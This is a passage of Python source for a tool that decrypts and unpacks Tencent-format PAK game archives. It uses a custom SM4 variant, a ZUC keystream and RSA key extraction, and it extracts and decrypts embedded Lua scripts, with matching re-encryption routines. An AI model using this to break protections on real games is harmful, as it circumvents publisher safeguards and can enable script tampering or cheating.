        return ((x << n) & 0xFFFFFFFF) | (x >> (32 - n))

_S_BOX = bytes([
    0x34, 0x66, 0x25, 0x74, 0x89, 0x78, 0xE4, 0xA9, 0x5A, 0x41, 0xBC, 0x7A, 0xD6, 0x16, 0x21, 0x23,
    0x4D, 0x61, 0xDA, 0x94, 0x9B, 0xDF, 0x13, 0x3C, 0x69, 0x3A, 0x31, 0x0A, 0x5F, 0xD7, 0x99, 0x95,
    0xF1, 0xAE, 0x72, 0x3D, 0x07, 0x60, 0x24, 0xB6, 0x98, 0xEE, 0xC4, 0xA2, 0x2D, 0x88, 0xDD, 0x8D,
    0x04, 0xEA, 0xBB, 0x11, 0xCA, 0x3E, 0x5D, 0xA1, 0xF6, 0x3F, 0xB0, 0x97, 0x80, 0x47, 0x2B, 0xA6,
    0xE6, 0xF7, 0xD9, 0xB1, 0x59, 0xC0, 0x7C, 0xBE, 0x54, 0x28, 0xB7, 0x7E, 0x4F, 0xF8, 0x43, 0x6E,
    0xA0, 0x50, 0x0E, 0xF5, 0x90, 0xB8, 0xFB, 0xA3, 0x7B, 0x62, 0x19, 0x46, 0x03, 0x2A, 0xB9, 0x8F,
    0x9F, 0x77, 0xB4, 0x5B, 0x83, 0x87, 0x08, 0xEB, 0xE2, 0x1E, 0x42, 0xF0, 0x0F, 0xE8, 0x71, 0x6A,
    0x75, 0xAD, 0x55, 0x1F, 0xB5, 0xAB, 0x33, 0xFA, 0x7F, 0x15, 0xBD, 0x85, 0xD8, 0x06, 0x68, 0xB3,
    0x52, 0x30, 0x48, 0x0B, 0x00, 0xED, 0xEF, 0xB2, 0x57, 0x8E, 0xE7, 0x6C, 0xD5, 0xE5, 0x2E, 0x53,
    0x82, 0x05, 0xF9, 0x81, 0xF4, 0x56, 0xBF, 0x8C, 0x4B, 0xE3, 0xDB, 0x4A, 0x91, 0x4C, 0x2C, 0xD3,
    0x40, 0x29, 0x4E, 0x20, 0x14, 0x36, 0x79, 0x09, 0x6F, 0xD1, 0x37, 0xE0, 0x39, 0x0C, 0x8A, 0x92,
    0x38, 0x12, 0x35, 0x6D, 0xE1, 0xFD, 0x93, 0x9A, 0x17, 0xD4, 0xC9, 0x9C, 0x6B, 0x84, 0x26, 0x9D,
    0xAF, 0x76, 0xC1, 0x9E, 0xD0, 0x96, 0xC5, 0xCB, 0xE9, 0x73, 0x49, 0xD2, 0xCD, 0x64, 0xC3, 0xC7,
    0x01, 0x7D, 0xF3, 0xAC, 0xFC, 0xDE, 0xA4, 0x44, 0x32, 0x1B, 0xC2, 0xBA, 0x1C, 0x02, 0xC6, 0x27,
    0x45, 0x8B, 0xF2, 0x18, 0xA7, 0x10, 0x51, 0x1D, 0xC8, 0xCF, 0x63, 0xFF, 0x2F, 0x0D, 0x58, 0xCE,
    0x65, 0xA5, 0xDC, 0x1A, 0x3B, 0x86, 0xFE, 0x22, 0x5C, 0xA8, 0x5E, 0x67, 0xAA, 0xEC, 0x70, 0xCC
])

_FK = [0x46970E9C, 0x4BC0685E, 0x59056186, 0xBCA2491E]
_CK = [
    0x000EB92B, 0x3A0AE783, 0x9E3B5C67, 0xADDBDABF, 0x7B7484CB, 0x49156C63, 0xC79AB5E7, 0x79EC9CFF,
    0x1725BEAB, 0x2FB89CA3, 0x24808AD7, 0xDDD28B1F, 0x4740DA4B, 0xBBC3EA73, 0x247B30E7, 0x91BE385F,
    0x0401248B, 0x45FCD3A3, 0x530B4CE7, 0xC68DD35F, 0xE3D16C2B, 0x4F698C13, 0x6B92C747, 0x769EFB1F,
    0x4C73BE9B, 0xC942B193, 0xAD80D827, 0x372FB33F, 0x13CB6AAB, 0x2BDC0AA3, 0x17A4A247, 0xD5E96CAF
]

def _BS(X):
    return ((_S_BOX[(X >> 24) & 0xff] << 24) |
            (_S_BOX[(X >> 16) & 0xff] << 16) |
            (_S_BOX[(X >> 8) & 0xff] << 8) |
            (_S_BOX[X & 0xff]))

def _T0(X):
    X = _BS(X)
    return X ^ ROL32(X, 2) ^ ROL32(X, 10) ^ ROL32(X, 18) ^ ROL32(X, 24)

def _T1(X):
    X = _BS(X)
    return X ^ ROL32(X, 13) ^ ROL32(X, 23)

def _key_expand(key: bytes, rkey: List[int]):
    K0 = int.from_bytes(key[0:4], "big") ^ _FK[0]
    K1 = int.from_bytes(key[4:8], "big") ^ _FK[1]
    K2 = int.from_bytes(key[8:12], "big") ^ _FK[2]
    K3 = int.from_bytes(key[12:16], "big") ^ _FK[3]
    for i in range(0, 32, 4):
        K0 = K0 ^ _T1(K1 ^ K2 ^ K3 ^ _CK[i])
        rkey[i] = K0
        K1 = K1 ^ _T1(K2 ^ K3 ^ K0 ^ _CK[i + 1])
        rkey[i + 1] = K1
        K2 = K2 ^ _T1(K3 ^ K0 ^ K1 ^ _CK[i + 2])
        rkey[i + 2] = K2
        K3 = K3 ^ _T1(K0 ^ K1 ^ K2 ^ _CK[i + 3])
        rkey[i + 3] = K3

class SM4(BlockCipher):
    @classmethod
    def key_length(self) -> int:
        return 16
    @classmethod
    def block_length(self) -> int:
        return 16
    def __init__(self, key: bytes) -> None:
        if len(key) != self.key_length():
            raise IncorrectLengthError("Key", f"{self.key_length()} bytes", f"{len(key)} bytes")
        self._key: bytes = key
        self._rkey: List[int] = [0] * 32
        _key_expand(self._key, self._rkey)
        self._block_buffer = bytearray()
    def encrypt(self, block: bytes) -> bytes:
        if len(block) != self.block_length():
            raise IncorrectLengthError("Block", f"{self.block_length()} bytes", f"{len(block)} bytes")
        RK = self._rkey
        X0 = int.from_bytes(block[0:4], "big")
        X1 = int.from_bytes(block[4:8], "big")
        X2 = int.from_bytes(block[8:12], "big")
        X3 = int.from_bytes(block[12:16], "big")
        for i in range(0, 32, 4):
            X0 = X0 ^ _T0(X1 ^ X2 ^ X3 ^ RK[i])
            X1 = X1 ^ _T0(X2 ^ X3 ^ X0 ^ RK[i + 1])
            X2 = X2 ^ _T0(X3 ^ X0 ^ X1 ^ RK[i + 2])
            X3 = X3 ^ _T0(X0 ^ X1 ^ X2 ^ RK[i + 3])
        BUFFER = self._block_buffer
        BUFFER.clear()
        BUFFER.extend(X3.to_bytes(4, "big"))
        BUFFER.extend(X2.to_bytes(4, "big"))
        BUFFER.extend(X1.to_bytes(4, "big"))
        BUFFER.extend(X0.to_bytes(4, "big"))
        return bytes(BUFFER)
    def decrypt(self, block: bytes) -> bytes:
        if len(block) != self.block_length():
            raise IncorrectLengthError("Block", f"{self.block_length()} bytes", f"{len(block)} bytes")
        RK = self._rkey
        X0 = int.from_bytes(block[0:4], "big")
        X1 = int.from_bytes(block[4:8], "big")
        X2 = int.from_bytes(block[8:12], "big")
        X3 = int.from_bytes(block[12:16], "big")
        for i in range(0, 32, 4):
            X0 = X0 ^ _T0(X1 ^ X2 ^ X3 ^ RK[31 - i])
            X1 = X1 ^ _T0(X2 ^ X3 ^ X0 ^ RK[30 - i])
            X2 = X2 ^ _T0(X3 ^ X0 ^ X1 ^ RK[29 - i])
            X3 = X3 ^ _T0(X0 ^ X1 ^ X2 ^ RK[28 - i])
        BUFFER = self._block_buffer
        BUFFER.clear()
        BUFFER.extend(X3.to_bytes(4, "big"))
        BUFFER.extend(X2.to_bytes(4, "big"))
        BUFFER.extend(X1.to_bytes(4, "big"))
        BUFFER.extend(X0.to_bytes(4, "big"))
        return bytes(BUFFER)

# ============================================================
# UTILITIES
# ============================================================

if not hasattr(it, 'batched'):
    def batched(iterable, n):
        import itertools
        if n < 1:
            raise ValueError('n must be at least one')
        it_obj = iter(iterable)
        while batch := tuple(itertools.islice(it_obj, n)):
            yield batch
    it.batched = batched

try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# ============================================================
# PAK + LUA DEPENDENCIES CHECK
# ============================================================

def check_lua_pak_dependencies():
    """Check if all required dependencies for PAK+LUA tool are installed"""
    missing = []
    
    try:
        import gmalg
    except ImportError:
        missing.append("gmalg")
    
    try:
        from Crypto.Cipher import AES
    except ImportError:
        missing.append("pycryptodome")
    
    try:
        import zstandard
    except ImportError:
        missing.append("zstandard")
    
    try:
        import requests
    except ImportError:
        missing.append("requests")
    
    try:
        import psutil
    except ImportError:
        missing.append("psutil")
    
    return missing

def install_lua_pak_deps():
    """Install missing dependencies for PAK+LUA tool"""
    missing = check_lua_pak_dependencies()
    
    if not missing:
        console.print("[green]✅ All dependencies are installed![/green]")
        return True
    
    console.print(f"[yellow]⚠ Missing dependencies: {', '.join(missing)}[/yellow]")
    
    install = Prompt.ask("[yellow]Install missing dependencies? (y/n)[/yellow]", choices=['y', 'n'], default='y')
    if install != 'y':
        return False
    
    with Progress(
        SpinnerColumn(spinner_name="dots12", style="bold cyan"),
        TextColumn("[progress.description]{task.description}"),
        console=console,
        transient=True
    ) as progress:
        task = progress.add_task("[cyan]Installing dependencies...", total=len(missing))
        
        for dep in missing:
            progress.update(task, description=f"[cyan]Installing {dep}...[/cyan]")
            try:
                if dep == "gmalg":
                    subprocess.run([sys.executable, "-m", "pip", "install", "gmalg"], 
                                 capture_output=True, timeout=120, check=True)
                elif dep == "pycryptodome":
                    subprocess.run([sys.executable, "-m", "pip", "install", "pycryptodome"], 
                                 capture_output=True, timeout=120, check=True)
                elif dep == "zstandard":
                    subprocess.run([sys.executable, "-m", "pip", "install", "zstandard"], 
                                 capture_output=True, timeout=120, check=True)
                elif dep == "requests":
                    subprocess.run([sys.executable, "-m", "pip", "install", "requests"], 
                                 capture_output=True, timeout=120, check=True)
                elif dep == "psutil":
                    subprocess.run([sys.executable, "-m", "pip", "install", "psutil"], 
                                 capture_output=True, timeout=120, check=True)
            except Exception as e:
                console.print(f"[red]Failed to install {dep}: {e}[/red]")
            progress.update(task, advance=1)
    
    missing_after = check_lua_pak_dependencies()
    if not missing_after:
        console.print("[green]✅ All dependencies installed successfully![/green]")
        return True
    else:
        console.print(f"[red]❌ Still missing: {', '.join(missing_after)}[/red]")
        return False

# ============================================================
# MEMORY MANAGER
# ============================================================

class MemoryManager:
    @staticmethod
    def get_available_ram_mb() -> int:
        if HAS_PSUTIL:
            try: return int(psutil.virtual_memory().available / 1024 / 1024)
            except Exception: pass
        return 512
    @staticmethod
    def should_use_mmap(file_size_bytes: int) -> bool:
        available_mb = MemoryManager.get_available_ram_mb()
        file_mb = file_size_bytes / 1024 / 1024
        threshold_mb = min(available_mb * 0.4, 200)
        return file_mb > threshold_mb
    @staticmethod
    def print_memory_status():
        if not HAS_PSUTIL: return
        try:
            mem = psutil.virtual_memory()
            total_mb = mem.total / 1024 / 1024
            avail_mb = mem.available / 1024 / 1024
            pct = mem.percent
            color = "green" if pct < 60 else ("yellow" if pct < 80 else "red")
            console.print(f"  [{color}]RAM: {avail_mb:.0f}MB free / {total_mb:.0f}MB total ({pct:.1f}% used)[/{color}]")
        except Exception: pass
    @staticmethod
    def force_gc(): gc.collect()

# ============================================================
# MMAP FILE READER
# ============================================================

class MmapFileReader:
    def __init__(self, file_path: Path):
        self._path = file_path
        self._file_size = file_path.stat().st_size
        self._f = None
        self._mmap = None
        self._buffer = None
        self._use_mmap = MemoryManager.should_use_mmap(self._file_size)
        file_mb = self._file_size / 1024 / 1024
        avail_mb = MemoryManager.get_available_ram_mb()
        if self._use_mmap:
            console.print(f"[cyan]Large file: {file_mb:.1f}MB (RAM: {avail_mb:.0f}MB) — using mmap I/O[/cyan]")
            self._open_mmap()
        else:
            console.print(f"[cyan]Loading {file_mb:.1f}MB file into memory...[/cyan]")
            self._load_direct()
    def _open_mmap(self):
        try:
            self._f = open(self._path, 'rb')
            self._mmap = mmap.mmap(self._f.fileno(), 0, access=mmap.ACCESS_READ)
            self._buffer = memoryview(self._mmap)
            console.print("[green]mmap active — RAM safe mode ON[/green]")
        except Exception as e:
            console.print(f"[yellow]mmap failed ({e}), falling back to direct load[/yellow]")
            self._fallback_chunked_load()
    def _load_direct(self):
        with open(self._path, 'rb') as f:
            self._buffer = memoryview(f.read())
    def _fallback_chunked_load(self):
        console.print("[yellow]Direct load — may use more RAM[/yellow]")
        try:
            with open(self._path, 'rb') as f:
                self._buffer = memoryview(f.read())
        except MemoryError:
            console.print("[red]CRITICAL: Not enough RAM![/red]")
            raise
    @property
    def buffer(self): return self._buffer
    def close(self):
        if self._mmap:
            try: self._mmap.close()
            except Exception: pass
        if self._f:
            try: self._f.close()
            except Exception: pass
        self._buffer = None
        MemoryManager.force_gc()
    def __enter__(self): return self
    def __exit__(self, *_): self.close()
    def __del__(self): self.close()

# ============================================================
# MISC / READER / WRITER
# ============================================================

class Misc:
    @staticmethod
    def pad_to_n(data: bytes, n: int) -> bytes:
        assert n > 0
        padding = n - len(data) % n
        return data if padding == n else data + b'\x00' * padding
    @staticmethod
    def align_up(x: int, n: int) -> int:
        return (x + n - 1) // n * n

class Reader:
    def __init__(self, buffer, cursor=0):
        self._buffer = buffer
        self._cursor = cursor
    def u1(self, move_cursor=True): return self.unpack('B', move_cursor=move_cursor)[0]
    def u4(self, move_cursor=True): return self.unpack('<I', move_cursor=move_cursor)[0]
    def u8(self, move_cursor=True): return self.unpack('<Q', move_cursor=move_cursor)[0]
    def i1(self, move_cursor=True): return self.unpack('b', move_cursor=move_cursor)[0]
    def i4(self, move_cursor=True): return self.unpack('<i', move_cursor=move_cursor)[0]
    def i8(self, move_cursor=True): return self.unpack('<q', move_cursor=move_cursor)[0]
    def s(self, n: int, move_cursor=True): return self.unpack(f'{n}s', move_cursor=move_cursor)[0]
    def unpack(self, f, offset=0, move_cursor=True):
        x = struct.unpack_from(f, self._buffer, self._cursor + offset)
        if move_cursor:
            self._cursor += struct.calcsize(f)
        return x
    def string(self, move_cursor=True) -> str:
        length = self.i4(move_cursor=move_cursor)
        if length == 0: return str()
        assert length > 0
        offset = 0 if move_cursor else 4
        return self.unpack(f'{length}s', offset=offset, move_cursor=move_cursor)[0].rstrip(b'\x00').decode()

class Writer:
    def __init__(self):
        self._buffer = bytearray()
    def u1(self, v): self.pack('B', v)
    def u4(self, v): self.pack('<I', v)
    def u8(self, v): self.pack('<Q', v)
    def i1(self, v): self.pack('b', v)
    def i4(self, v): self.pack('<i', v)
    def i8(self, v): self.pack('<q', v)
    def s(self, data: bytes): self._buffer.extend(data)
    def pack(self, f, *values):
        self._buffer.extend(struct.pack(f, *values))
    def string(self, text: str):
        encoded = text.encode() + b'\x00'
        self.i4(len(encoded))
        self.s(encoded)
    def get_buffer(self) -> bytes: return bytes(self._buffer)
    def size(self) -> int: return len(self._buffer)
    def align_to(self, alignment: int):
        current_size = len(self._buffer)
        padding = (alignment - current_size % alignment) % alignment
        if padding > 0:
            self._buffer.extend(b'\x00' * padding)

# ============================================================
# PAK CLASSES
# ============================================================

try:
    import gmalg
    from Crypto.Cipher import AES
    from Crypto.Cipher.AES import MODE_CBC
    from Crypto.Hash import SHA1
    from Crypto.Util.Padding import unpad, pad
    from zstandard import ZstdDecompressor, ZstdCompressor, ZstdCompressionDict, DICT_TYPE_AUTO
    HAS_PAK_DEPS = True
except ImportError as e:
    HAS_PAK_DEPS = False
    _PAK_IMPORT_ERROR = str(e)

if HAS_PAK_DEPS:
    class PakInfo:
        def __init__(self, buffer, keystream):
            def dec_enc(x):   return (x ^ keystream[3]) & 255
            def dec_magic(x): return x ^ keystream[2]
            def dec_hash(x):
                key = struct.pack('<5I', *keystream[4:][:5])
                return bytes(a ^ b for a, b in zip(x, key))
            def dec_isz(x):   return x ^ (keystream[10] << 32 | keystream[11])
            def dec_ioff(x):  return x ^ (keystream[0]  << 32 | keystream[1])
            reader = Reader(buffer[-PakInfo._mem_size(-1):])
            self.index_encrypted = dec_enc(reader.u1()) == 1
            self.magic = dec_magic(reader.u4())
            self.version = reader.u4()
            self.index_hash = dec_hash(reader.s(20)) if self.version >= 6 else bytes()
            self.index_size = dec_isz(reader.u8())
            self.index_offset = dec_ioff(reader.u8())
            if self.version <= 3: self.index_encrypted = False
        @staticmethod
        def _mem_size(_): return 45

    class TencentPakInfo(PakInfo):
        def __init__(self, buffer, keystream):
            def dec_unk(x):
                key = struct.pack('<8I', *keystream[7:][:8])
                return bytes(a ^ b for a, b in zip(x, key))
            def dec_stem(x): return x ^ keystream[8]
            def dec_unkh(x): return x ^ keystream[9]
            super().__init__(buffer, keystream)
            reader = Reader(buffer[-TencentPakInfo._mem_size(self.version):])
            self.unk1 = dec_unk(reader.s(32)) if self.version >= 7 else bytes()
            self.packed_key = reader.s(256) if self.version >= 8 else bytes()
            self.packed_iv = reader.s(256) if self.version >= 8 else bytes()
            self.packed_index_hash = reader.s(256) if self.version >= 8 else bytes()
            self.stem_hash = dec_stem(reader.u4()) if self.version >= 9 else 0
            self.unk2 = dec_unkh(reader.u4()) if self.version >= 9 else 0
            self.content_org_hash = reader.s(20) if self.version >= 12 else bytes()
        @staticmethod
        def _mem_size(version):
            return (PakInfo._mem_size(version) +
                    (32 if version >= 7 else 0) +
                    (768 if version >= 8 else 0) +
                    (8 if version >= 9 else 0) +
                    (20 if version >= 12 else 0))

    class PakCompressedBlock:
        def __init__(self, reader):
            self.start = reader.u8()
            self.end = reader.u8()

    @dataclass
    class TencentPakEntry:
        def __init__(self, reader, version):
            self.content_hash = reader.s(20)
            if version <= 1: _ = reader.u8()
            self.offset = reader.u8()
            self.uncompressed_size = reader.u8()
            self.compression_method = reader.u4() & CM_MASK
            self.size = reader.u8()
            self.unk1 = reader.u1() if version >= 5 else 0
            self.unk2 = reader.s(20) if version >= 5 else bytes()
            self.compressed_blocks = ([PakCompressedBlock(reader) for _ in range(reader.u4())]
                                       if self.compression_method != 0 and version >= 3 else [])
            self.compression_block_size = reader.u4() if version >= 4 else 0
            self.encrypted = reader.u1() == 1 if version >= 4 else False
            self.encryption_method = reader.u4() if version >= 12 else 0
            self.index_new_sep = reader.u4() if version >= 12 else 0

    class PakCrypto:
        class _LCG:
            def __init__(self, seed): self.state = seed
            def next(self):
                MASK = 4294967295; MSB = 2147483648
                def wrap(x):
                    x &= MASK
                    return (x + MSB & MASK) - MSB if x & MSB else x
                x1 = wrap(1103515245 * self.state)
                self.state = wrap(x1 + 12345)
                x2 = wrap(x1 + 77880) if self.state < 0 else self.state
                return (x2 >> 16 & MASK) % 32767
        @staticmethod
        def zuc_keystream():
            zuc = gmalg.ZUC(ZUC_KEY, ZUC_IV)
            return [struct.unpack('>I', zuc.generate())[0] for _ in range(16)]
        @staticmethod
        def _xorxor(buffer, x):
            return bytes(buffer[i] ^ x[i % len(x)] for i in range(len(buffer)))
        @staticmethod
        def _hashhash(buffer, n):
            result = bytes()
            for _ in range(math.ceil(n / SHA1.digest_size)):
                result += SHA1.new(buffer).digest()
            return result[:n] if len(result) >= n else result + b'\x00' * (n - len(result))
        @staticmethod
        def _meowmeow(buffer):
            def unpad_inner(x):
                skip = 1 + next((i for i in range(len(x)) if x[i] != 0))
                return x[skip:]
            if len(buffer) < 43: return bytes()
            x1 = buffer[1:][:SHA1.digest_size]
            x2 = buffer[SHA1.digest_size + 1:]
            x1 = PakCrypto._xorxor(x1, PakCrypto._hashhash(x2, len(x1)))
            x2 = PakCrypto._xorxor(x2, PakCrypto._hashhash(x1, len(x2)))
            part1, m = (x2[:SHA1.digest_size], x2[SHA1.digest_size:])
            if part1 != SHA1.new(b'\x00' * SHA1.digest_size).digest(): return bytes()
            return unpad_inner(m)
        @staticmethod
        def rsa_extract(signature, modulus):
            c = int.from_bytes(signature, 'little')
            n = int.from_bytes(modulus, 'little')
            m = pow(c, 65537, n).to_bytes(256, 'little').rstrip(b'\x00')
            return PakCrypto._meowmeow(Misc.pad_to_n(m, 4))
        @staticmethod
        def _decrypt_simple1(ct): return bytes(x ^ SIMPLE1_DECRYPT_KEY for x in ct)
        @staticmethod
        def _decrypt_simple2(ct):
            class RK:
                def __init__(self, v): self._v = v
                def update(self, x): self._v ^= x; return self._v
            assert len(ct) % SIMPLE2_BLOCK_SIZE == 0
            ik, = struct.unpack('<I', SIMPLE2_DECRYPT_KEY)
            rk = RK(ik)
            pt = (struct.pack('<I', rk.update(x)) for x in struct.unpack(f'<{len(ct)//4}I', ct))
            return bytes(it.chain.from_iterable(pt))
        @staticmethod
        @lru_cache(maxsize=1)
        def _derive_sm4_key(file_path, encryption_method):
            part1 = file_path.stem.lower()
            if encryption_method == EM_SM4_2: secret = SM4_SECRET_2
            elif encryption_method == EM_SM4_4: secret = SM4_SECRET_4
            else:
                idx = (encryption_method - EM_SM4_NEW_BASE) % len(SM4_SECRET_NEW)
                secret = f'{SM4_SECRET_NEW[idx]}{encryption_method}'
            return SHA1.new(str(part1 + secret).encode()).digest()[:SM4.key_length()]
        @staticmethod
        @lru_cache(maxsize=1)
        def _sm4_context_for_key(key): return SM4(key)
        @staticmethod
        def _decrypt_sm4(ct, file_path, enc_m):
            assert len(ct) % SM4.block_length() == 0
            key = PakCrypto._derive_sm4_key(file_path, enc_m)
            sm4 = PakCrypto._sm4_context_for_key(key)
            return bytes(it.chain.from_iterable(sm4.decrypt(x) for x in it.batched(ct, SM4.block_length())))
        @staticmethod
        def decrypt_index(ct, pak_info):
            if pak_info.version > 7:
                key = PakCrypto.rsa_extract(pak_info.packed_key, RSA_MOD_1)
                iv = PakCrypto.rsa_extract(pak_info.packed_iv, RSA_MOD_1)
                aes = AES.new(key, MODE_CBC, iv[:16])
                return unpad(aes.decrypt(ct), AES.block_size)
            return bytes(PakCrypto._decrypt_simple1(ct))
        @staticmethod
        def _is_simple1(m): return m == EM_SIMPLE1
        @staticmethod
        def _is_simple2(m): return m == EM_SIMPLE2
        @staticmethod
        def _is_sm4(m): return m == EM_SM4_2 or m == EM_SM4_4 or m & EM_SM4_NEW_MASK != 0
        @staticmethod
        def align_encrypted_content_size(n, enc_m):
            if PakCrypto._is_simple2(enc_m): return Misc.align_up(n, SIMPLE2_BLOCK_SIZE)
            elif PakCrypto._is_sm4(enc_m): return Misc.align_up(n, SM4.block_length())
            return n
        @staticmethod
        def decrypt_block(ct, file, enc_m):
            if enc_m == 17: return ct
            elif PakCrypto._is_simple1(enc_m): return PakCrypto._decrypt_simple1(ct)
            elif PakCrypto._is_simple2(enc_m): return PakCrypto._decrypt_simple2(ct)
            elif PakCrypto._is_sm4(enc_m): return PakCrypto._decrypt_sm4(ct, file, enc_m)
            assert False
        @staticmethod
        @lru_cache(maxsize=33)
        def generate_block_indices(n, enc_m):
            if not PakCrypto._is_sm4(enc_m): return list(range(n))
            perm, lcg = [], PakCrypto._LCG(n)
            while len(perm) != n:
                x = lcg.next() % n
                if x not in perm: perm.append(x)
            inv = [0] * n
            for i, x in enumerate(perm): inv[x] = i
            return inv
        @staticmethod
        def _encrypt_simple1(pt): return bytes(b ^ SIMPLE1_DECRYPT_KEY for b in pt)
        @staticmethod
        def _encrypt_simple2(pt):
            padded = Misc.pad_to_n(pt, SIMPLE2_BLOCK_SIZE)
            ik, = struct.unpack('<I', SIMPLE2_DECRYPT_KEY)
            ks = ik
            words = []
            for w in struct.unpack(f'<{len(padded)//4}I', padded):
                cw = w ^ ks
                ks = w
                words.append(cw)
            return struct.pack(f'<{len(words)}I', *words)
        @staticmethod
        def _encrypt_sm4(pt, file_path, enc_m):
            padded = Misc.pad_to_n(pt, SM4.block_length())
            key = PakCrypto._derive_sm4_key(file_path, enc_m)
            sm4 = PakCrypto._sm4_context_for_key(key)
            out = bytearray()
            for i in range(0, len(padded), SM4.block_length()):
                out.extend(sm4.encrypt(padded[i:i+SM4.block_length()]))
            return bytes(out)
        @staticmethod
        def encrypt_block(pt, file, enc_m):
            if enc_m == 17: return pt
            elif PakCrypto._is_simple1(enc_m): return PakCrypto._encrypt_simple1(pt)
            elif PakCrypto._is_simple2(enc_m): return PakCrypto._encrypt_simple2(pt)
            elif PakCrypto._is_sm4(enc_m): return PakCrypto._encrypt_sm4(pt, file, enc_m)
            assert False

    class PakCompression:
        @staticmethod
        @lru_cache(maxsize=33)
        def _zstd_decompressor(d):
            if isinstance(d, bytes): d = ZstdCompressionDict(d, DICT_TYPE_AUTO)
            return ZstdDecompressor(d)
        @staticmethod
        def decompress_block(block, dict_, comp_m):
            if comp_m == CM_ZLIB: return zlib.decompress(block)
            elif comp_m in (CM_ZSTD, CM_ZSTD_DICT):
                d = dict_ if comp_m == CM_ZSTD_DICT else None
                return PakCompression._zstd_decompressor(d).decompress(block)
            assert False

    class TencentPakFile:
        def __init__(self, file_path, is_od=False):
            self._file_path = PurePath(file_path)
            self._is_od = is_od
            self._mount_point = PurePath()
            self._is_zstd_dict = 'zsdic' in str(self._file_path)
            self._zstd_dict = None
            self._files = []
            self._index = {}
            fp_obj = Path(file_path)
            self._reader = MmapFileReader(fp_obj)
            self._file_content = self._reader.buffer
            self._pak_info = TencentPakInfo(self._file_content, PakCrypto.zuc_keystream())
            self._verify_stem_hash()
            self._tencent_load_index()
            MemoryManager.print_memory_status()
        def close(self):
            if hasattr(self, '_reader'): self._reader.close()
        def __del__(self): self.close()
        def _verify_stem_hash(self):
            if not self._is_od and self._pak_info.version >= 9:
                assert self._pak_info.stem_hash == zlib.crc32(self._file_path.stem.encode('utf-32le'))
        def _tencent_load_index(self):
            idx_data = self._file_content[self._pak_info.index_offset:][:self._pak_info.index_size]
            if self._pak_info.index_encrypted:
                idx_data = PakCrypto.decrypt_index(idx_data, self._pak_info)
            self._verify_index_hash(idx_data)
            self._load_index(idx_data)
        def _verify_index_hash(self, idx_data):
            expected = self._pak_info.index_hash
            if not self._is_od and self._pak_info.version >= 8:
                assert expected == PakCrypto.rsa_extract(self._pak_info.packed_index_hash, RSA_MOD_2)
            assert expected == SHA1.new(idx_data).digest()
        @staticmethod
        def _construct_mount_point(mp):
            result = PurePath()
            for part in PurePath(mp).parts:
                if part != '..': result /= part
            return result
        def _peek_content(self, offset, size, enc_m):
            size = PakCrypto.align_encrypted_content_size(size, enc_m)
            return self._file_content[offset:][:size]
        def _peek_block_content(self, block, enc_m):
            size = PakCrypto.align_encrypted_content_size(block.end - block.start, enc_m)
            return self._file_content[block.start:][:size]
        def _construct_zstd_dict(self, dict_entry):
            assert not self._zstd_dict and not dict_entry.encrypted
            assert dict_entry.compression_method == CM_NONE
            reader = Reader(self._peek_content(dict_entry.offset, dict_entry.size, 0))
            dict_size = reader.u8()
            _ = reader.u4()
            assert dict_size == reader.u4()
            dict_data = reader.s(dict_size)
            if isinstance(dict_data, tuple): dict_data = dict_data[0] if dict_data else b''
            self._zstd_dict = ZstdCompressionDict(dict_data, dict_type=DICT_TYPE_AUTO)
        def _load_index(self, idx_data):
            assert self._pak_info.version > 10
            reader = Reader(idx_data)
            self._mount_point = self._construct_mount_point(reader.string())
            self._files = [TencentPakEntry(reader, self._pak_info.version) for _ in range(reader.u4())]
            for _ in range(reader.u8()):
                dir_path = PurePath(reader.string())
                e = {reader.string(): self._files[~reader.i4()] for _ in range(reader.u8())}
                if self._is_zstd_dict and dir_path.name == 'zstddic':
                    self._construct_zstd_dict(e[[*e.keys()][0]])
                else:
                    self._index.update({PurePath(dir_path): e})
        def _write_to_disk(self, file_path, entry):
            if entry.encrypted and entry.encryption_method == 17: return
            enc_m = entry.encryption_method
            comp_m = entry.compression_method
            with open(file_path, 'wb') as file:
                if comp_m == CM_NONE:
                    data = self._peek_content(entry.offset, entry.size, enc_m)
                    if entry.encrypted:
                        data = PakCrypto.decrypt_block(data, file_path, enc_m)
                    file.write(data)
                    return
                for x in PakCrypto.generate_block_indices(len(entry.compressed_blocks), enc_m):
                    data = self._peek_block_content(entry.compressed_blocks[x], enc_m)
                    if entry.encrypted:
                        data = PakCrypto.decrypt_block(data, file_path, enc_m)
                    data = PakCompression.decompress_block(data, self._zstd_dict, comp_m)
                    file.write(data)
        def dump(self, out_path, pak_stem, also_decrypt=False):
            flat_dir = UNPACKED_DIR / pak_stem
            flat_dir.mkdir(parents=True, exist_ok=True)
            manifest = ManifestGenerator(self._file_path.name)
            manifest.set_extraction_mode(False)
            total_files = sum(len(f) for f in self._index.values())
            console.print(f"[cyan]Scanning {total_files} files — extracting .lua only...[/cyan]")
            MemoryManager.print_memory_status()
            t0 = time.time()
            extracted_lua = 0
            with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                          BarColumn(), MofNCompleteColumn(), TimeElapsedColumn()) as prog:
                task = prog.add_task("Extracting...", total=total_files)
                for dir_path, dir_dict in self._index.items():
                    for fname, entry in dir_dict.items():
                        prog.update(task, advance=1, description=f"[cyan]{fname[:40]}")
                        if Path(fname).suffix.lower() != '.lua': continue
                        if entry.encrypted and entry.encryption_method == 17: continue
                        full_rel = dir_path / fname
                        actual_off = (entry.compressed_blocks[0].start if entry.compressed_blocks else entry.offset)
                        actual_size = (entry.compressed_blocks[0].end - entry.compressed_blocks[0].start
                                       if entry.compressed_blocks else entry.size)
                        out_file = flat_dir / fname
                        try:
                            self._write_to_disk(out_file, entry)
                            manifest.add_file_entry(full_rel, entry, actual_off, actual_size)
                            extracted_lua += 1
                        except Exception as e:
                            console.print(f"[red]Failed {fname}: {e}[/red]")
            console.print(f"[green]Extracted {extracted_lua} .lua files in {time.time()-t0:.1f}s -> {flat_dir}[/green]")
            MemoryManager.print_memory_status()
            mdir = MANIFEST_DIR / pak_stem
            mdir.mkdir(parents=True, exist_ok=True)
            manifest.save(mdir)
            if also_decrypt and extracted_lua > 0:
                console.print(f"\n[yellow]═══ Auto-Decrypting LUA files ═══[/yellow]")
                lua_files = list(flat_dir.glob('*.lua'))
                console.print(f"[cyan]Decrypting {len(lua_files)} files...[/cyan]")
                dec_dir = LUA_DECOMPILED_DIR / pak_stem
                orig_dir = LUA_ORIGINAL_DIR / pak_stem
                dec_dir.mkdir(parents=True, exist_ok=True)
